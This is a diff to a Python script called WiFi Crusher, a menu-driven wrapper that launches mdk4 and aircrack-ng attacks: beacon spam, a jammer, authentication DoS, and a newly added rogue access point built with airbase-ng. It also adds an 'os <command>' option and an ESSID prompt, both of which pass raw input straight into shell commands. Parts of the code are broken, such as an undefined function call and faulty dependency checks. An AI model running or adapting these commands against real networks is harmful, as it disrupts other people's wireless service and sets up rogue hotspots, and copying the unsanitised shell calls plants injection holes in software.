@@ -1,4 +1,4 @@
-#!/usr/bin/python3.7
+#!/usr/bin/python3
 import os
 import string
 import time
@@ -8,45 +8,59 @@ import subprocess
 import sys
 from getpass import getpass
 import pwd
+import readline
 
+__author__ = "inquisition-musician"
+__version__ = "v1.2" 
 chars = string.ascii_letters + string.digits + '!@#$%^*()'
+logolist = [""" 
+                  ____     ____  _          ___          ___  _
+      |  /|  / / /     /  /     / |  /   / /     /   /  /    / |
+      | / | / / /---- /  /     /--- /   / /__   /---/  /--- /---
+      |/  |/ / /     /  /___  /  | /___/  ___/ /   /  /___ /|
+                                v1.2 
+   	https://github.com/inquisition-musician/wifi_crusher
+   	    https://github.com/aircrack-ng/aircrack-ng
+   	       https://github.com/aircrack-ng/mdk4""", 
+"""               _  __ _                        _               
+     __      _(_)/ _(_)    ___ _ __ _   _ ___| |__   ___ _ __ 
+     \ \ /\ / | | |_| |   / __| '__| | | / __| '_ \ / _ | '__|
+      \ V  V /| |  _| |  | (__| |  | |_| \__ | | | |  __| |   
+       \_/\_/ |_|_| |_|___\___|_|   \__,_|___|_| |_|\___|_|   
+                    |_____|                          
+                               v1.2
+       https://github.com/inquisition-musician/wifi_crusher
+          https://github.com/aircrack-ng/aircrack-ng
+   	      https://github.com/aircrack-ng/mdk4"""] 
 random.seed(os.urandom(1024))
-ByeList = ["Poka", "Sayonara", "Adios", "Goodbye", "Hasta La Vista", "Alividercci", "Do pobachennya", "Auf Wiedersehen", "Zaijian"]
+ByeList = ["Poka", "Sayonara", "Au revuior", "Goodbye", "Hasta La Vista", "Arrivederci", "Do pobachennya", "Auf Wiedersehen", "Zaijian"]
 clear = "clear"
-QuoteList = ["Ok, so what? Is that all? No, I think I screwed your WiFi :3 See ya later :D", "Don't attempt to use it on another person's WiFi, cuz' it's really illegal and stupid", "GNU comes with ABSOLUTLEY NO WARRANTY, to the extent pemitted by applicable law.", "Use your electronics smartly, so you won't get to jail for that thing :D", "I don't think that WiFi Crusher won't kill my WiFi, but I don't think so!", "This is really pity, don't you think?", "i aM gOInG t0 h4Ck Ur Internet(typical script kiddie)", "I suggest use this tool to troll Tech Support scammers)", "Try poking around, see if you find something.", "I tried making my own tool, but I made an overlay for MDK4.", "Simply put, code for MAC addresses doesn't work.", "Thank you, aircrack-ng team for making fantastic tools. I wrote WiFi Crusher in two weeks.", "Hey, stop the music, or I'll kill your WiFi!"]
+QuoteList = ["Ok, so what? Is that all? No, I think I screwed your WiFi :3 See ya later :D", "Don't attempt to use it on another person's WiFi, cuz' it's really illegal and stupid", "GNU comes with ABSOLUTLEY NO WARRANTY, to the extent pemitted by applicable law.", "Use your electronics smartly, so you won't get to jail for that thing :D", "I don't think that WiFi Crusher won't kill my WiFi, but I don't think so!", "This is really pity, don't you think?", "i aM gOInG t0 h4Ck Ur Internet(typical script kiddie)", "I suggest use this tool to troll Tech Support scammers)", "Try poking around, see if you find something.", "I tried making my own tool, but I made an overlay for MDK4.", "Simply put, code for MAC addresses doesn't work.", "Thank you, aircrack-ng team for making fantastic tools. I wrote WiFi Crusher in two weeks.", "Hey, stop the music, or I'll kill your WiFi!", "FBI! Open the door! You arrested under the Computer Fraud and Abuse act of 1986!", "I'm doing this, like Apple. If I remove the feature, then so many monkeys."]
 mac_list = ["A", "B", "C", "D", "E", "F"]
 def main():
 	try:
 		os.system("airmon-ng start wlan0")
 		os.system(clear)
 		menu()
+		menu2()
+		menu3()
 		choice_logic()
-	except KeyboardInterrupt:
+	except KeyboardInterrupt: 
 		exit_state()
 
 def menu():
 	os.system(clear)
-	print(random.choice(QuoteList) + """ 
-                  ____     ____  _          ___          ___  _
-      |  /|  / / /     /  /     / |  /   / /     /   /  /    / |
-      | / | / / /---- /  /     /--- /   / /__   /---/  /--- /---
-      |/  |/ / /     /  /___  /  | /___/  ___/ /   /  /___ /|
-                                v1.1 
-   	https://github.com/inquisition-musician/wifi_crusher
-   	    https://github.com/aircrack-ng/aircrack-ng
-   	       https://github.com/aircrack-ng/mdk4
-
-   	       [1]WiFi Spammer
+	print(random.choice(QuoteList))
+def menu2():
+	print(random.choice(logolist))
+def menu3():
+	print("""
+	       [1]WiFi Spammer
    	       [2]WiFi Jammer
    	       [3]Dump of the hotspots
    	       [4]Authentication DoS
-               [99]Exit
-               [R]Reload
-               [C]Clear screen with no menu
-               [D]Disable monitoring mode
-               [E]Re-enable monitoring mode
-               [I]Interface Configuration(ifconfig)
-               [S]Shell.
+               [5]UOH(Ur Own Hotspot)
+	       [99]Exit
                [A]About the tool
 """)
 def choice_logic():
@@ -56,27 +70,19 @@ def choice_logic():
 	elif choice == "2":
 		wifi_jammer()
 	elif choice == "3":
+		os.system("airmon-ng start wlan0")
 		os.system("airodump-ng wlan0mon")
 		choice_logic()
 	elif choice == "4":
 		authdos()
 		choice_logic()
+	elif choice == "5":
+		hotspot()
+		choice_logic()
 	elif choice == "99" or choice == "exit":
 		exit_state()
-	elif choice == "r" or choice == "R":
-		menu()
-		choice_logic()
-	elif choice == "c" or choice == "C" or choice == "clear":
+	elif choice == "clear":
 		os.system(clear)
-		choice_logic()
-	elif choice == "d" or choice == "D":
-		os.system("airmon-ng stop wlan0mon")
-		choice_logic()
-	elif choice == "e" or choice == "E":
-		os.system("airmon-ng start wlan0")
-		choice_logic()
-	elif choice == "i" or choice == "I":
-		os.system("ifconfig")
 		choice_logic()
 	elif choice == "a" or choice == "A":
 		about()
@@ -89,25 +95,25 @@ def choice_logic():
 	elif choice == "help" or choice == "Help" or choice == "HELP":
 		helpmenu()
 	elif choice == "s" or choice == "S" or choice == "shell":
-		shell()
+		print("There is no such feature anymore. Use \"os <command>\"")
+		choice_logic()
+	elif choice[0:2] == "os":
+		os.system(choice[3:])
 		choice_logic()
 	elif choice == "msfconsole":
 		rapid7hello()
 	elif choice == "l" or choice == "fsociety":
 		lscriptandfsociety()
 	else:
-		print("Type 'help' to get instructions, or pick 'R' to reload screen")
-		choice_logic()
-	try:
-		choice_logic()
-	except KeyboardInterrupt:
-		print("Type in \"99\", or \"exit\" to quit the program")
+		print("Type 'help' to get instructions, type 'R' to reload screen, or type \"os <shellcommand>\"")
 		choice_logic()
 
 def wifi_spammer():
+	os.system("airmon-ng start wlan0")
 	os.system("mdk4 wlan0mon b -m -s 500")
 	choice_logic()
 def wifi_jammer():
+	os.system("airmon-ng start wlan0")
 	os.system("mdk4 wlan0mon f -s abp -m bmstm -p 4000")
 	choice_logic()
 def exit_state():
@@ -115,6 +121,22 @@ def exit_state():
 	os.system(clear)
 	print(random.choice(ByeList) + "!")
 	exit()
+def hotspot():
+	os.system("airmon-ng start wlan0")
+	os.system("clear")
+	os.system("figlet UOH")
+	hot_name = input("Input your name here> ")
+	channel = ''.join(random.choice(string.digits))
+	os.system("airbase-ng -a " + function(rand_mac) + " --essid " + hot_name + " -c " + channel + " wlan0mon")
+def rand_mac():
+    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
+        random.randint(0, 255),
+        random.randint(0, 255),
+        random.randint(0, 255),
+        random.randint(0, 255),
+        random.randint(0, 255),
+        random.randint(0, 255)
+        )
 def about():
 	os.system(clear)
 	print("""About the tool.
@@ -147,7 +169,7 @@ Funnily enough, you found this easter egg.
 """)
 	choice = getpass("Press and enter any key to continue! ")
 	if choice == "frdbg":
-		print("OK, this is for debugging purposes.")
+		frdbg()
 	else:
 		menu()
 		choice_logic()
@@ -155,6 +177,7 @@ Funnily enough, you found this easter egg.
 def frdbg():
 	os.system("airmon-ng stop wlan0mon")
 	print("OK, this is for debugging purposes.")
+	exit()
 
 def helpmenu():
 	print("""
@@ -166,17 +189,10 @@ Commands for WiFi Crusher.
 |[4] - Authentication   | Spamming authentication packets.     |
 |      DoS              | (Warning! It may paralyze any AP in  |
 |                       | range of your location!)             |
+|[5] - UOH(YoUr Own     | It allows you to create your own     |
+|          Hotspot)	| rouge hotspot with your name.        |
 |[99] - Exit            | Exit. Simple enough.                 |
-|[R] - Reload menu      | For reloading menu.                  |
-|[C] - Clear screen     | For clearing the screen.             |
-|[D] - Disable monitor  | As described in the title.           |
-|      mode.            |                                      |
-|[E] - Enable monitor   | OK, Auto-enable doesn't work         |
-|      mode             |                                      |
-|[I] - ifconfig         | Interface Configuration.             |
 |[A] - About            | Shows 'About' screen                 |
-|[s] or shell - little  | Description explains all             |
-|               shell   | itself                               |
  ==============================================================
 Take a look at the code, find some easter eggs) Funny, as it's 
 sounds, but it's GNU, it's free to take a look under the hood.
@@ -185,15 +201,16 @@ sounds, but it's GNU, it's free to take a look under the hood.
 	choice_logic()
 
 def boobs():
-	print(""" ï¼ˆâ€¢_ã……_â€¢ï¼‰ 
+	print(""" （•_ㅅ_•） 
 		""")
 	choice = getpass("Press and enter any key to continue! ")
 	if choice == "frdbg":
-		print("OK, this is for debugging purposes.")
+		frdbg()
 	else:
 		choice_logic()
 
 def authdos():
+	os.system("airmon-ng start wlan0")
 	os.system("mdk4 wlan0mon a -m -s 1000")
 
 def shell():
@@ -211,7 +228,7 @@ inquisition-musician.
 """)
 	choice = getpass("Press and enter any key to continue! ")
 	if choice == "frdbg":
-		print("OK, this is for debugging purposes.")
+		frdbg()
 	elif choice == "f" or choice == "F":
 		print("Farewell.(")
 	else:
@@ -229,32 +246,33 @@ inquisition-musician.
 	choice_logic()
 
 def checkdep():
-	if os.path.isfile("/usr/bin/aircrack-ng") and os.path.isfile("/usr/sbin/mdk4") == True:
-		main()
-	elif os.path.isfile("/usr/sbin/mdk4") == False:
-		install = input("Would you like to install MDK4?[Y/n] ")
-		if install == "y" or install == "Y":
-			os.system("apt-get install mdk4")
-		if install == "n" or install == "N":
-			exit()
-	elif os.path.isfile("/usr/bin/aircrack-ng") == False:
-		install_air = input("Would you like to install aircrack-ng?[Y/n] ")
-		if install_air == "y" or install_air == "Y":
-			os.system("apt-get install aircrack-ng")
-		elif install_air == "n" or install_air == "n":
-			exit()
-	else:
+	if os.path.isfile("/usr/bin/aircrack-ng") and os.path.isfile("/usr/sbin/mdk4") and os.path.isfile("/usr/bin/figlet") == False:
 		print("Installing dependencies...")
 		time.sleep(2)
-		os.system("apt-get install aircrack-ng && apt-get install mdk4")
-		menu()
-		choice_logic()
+		os.system("brew install aircrack-ng && brew install mdk4 && brew install figlet")
+		os.system("apt-get install aircrack-ng && apt-get install mdk4 && apt-get install figlet")
+	elif os.path.isfile("/usr/sbin/mdk4") == False:
+		print("Installing dependencies...")
+		time.sleep(2)
+		os.system("brew install mdk4")
+		os.system("apt-get install mdk4")
+	elif os.path.isfile("/usr/bin/aircrack-ng") == False:
+		print("Installing dependencies...")
+		time.sleep(2)
+		os.system("brew install aircrack-ng")
+		os.system("apt-get install aircrack-ng")
+	elif os.path.isfile("/usr/bin/figlet") == False:
+		print("Installing dependencies...")
+		time.sleep(2)
+		os.system("brew install figlet")
+		os.system("apt-get install figlet")
+	else:
+		main()
 
 def checkroot():
 	if pwd.getpwuid(os.geteuid()).pw_gecos != "root":
 		print("Run as root, or use \"sudo\" command")
 	else:
 		checkdep()
-		main()
 
 checkroot()
